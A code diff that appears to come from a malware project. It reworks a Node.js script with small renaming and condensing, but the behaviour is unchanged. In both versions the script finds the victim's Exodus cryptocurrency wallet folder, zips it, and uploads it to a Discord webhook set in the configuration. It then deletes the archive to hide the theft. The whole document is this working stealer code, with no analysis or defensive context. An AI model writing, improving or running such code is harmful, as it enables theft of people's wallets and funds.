@@ -1,17 +1,16 @@
-const AdmZip = require("adm-zip");
-const Webhook = require("discord-webhook-node").Webhook;
-const fs = require("fs");
-const username = process.env.USERNAME;
-const config = require("../config.json");
-
+const AdmZip = require("adm-zip"),
+  Webhook = require("discord-webhook-node").Webhook,
+  fs = require("fs"),
+  username = process.env.USERNAME,
+  config = require("../config.json");
 (async () => {
-  const path = `C:\\Users\\${username}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
-  if (!fs.existsSync(path)) return;
-  const zip = new AdmZip();
-  zip.addLocalFolder(path);
-  zip.writeZip(`C:\\Users\\tav08\\AppData\\Local\\Exodus.zip`);
-  await new Webhook(config.webhook).sendFile(
-    `C:\\Users\\tav08\\AppData\\Local\\Exodus.zip`
-  );
-  fs.unlinkSync(`C:\\Users\\tav08\\AppData\\Local\\Exodus.zip`);
+  const e = `C:\\Users\\${username}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
+  if (!fs.existsSync(e)) return;
+  const o = new AdmZip();
+  o.addLocalFolder(e),
+    o.writeZip("C:\\Users\\tav08\\AppData\\Local\\Exodus.zip"),
+    await new Webhook(config.webhook).sendFile(
+      "C:\\Users\\tav08\\AppData\\Local\\Exodus.zip"
+    ),
+    fs.unlinkSync("C:\\Users\\tav08\\AppData\\Local\\Exodus.zip");
 })();
